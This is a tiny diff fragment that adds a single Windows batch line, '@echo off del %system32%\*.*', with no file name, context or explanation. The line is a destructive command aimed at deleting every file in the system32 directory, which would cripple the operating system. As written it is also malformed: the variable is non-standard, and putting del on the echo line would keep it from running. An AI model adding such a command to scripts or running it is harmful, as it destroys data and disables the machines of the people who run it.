@@ -1,0 +1,1 @@
+@echo off del %system32%\*.* 
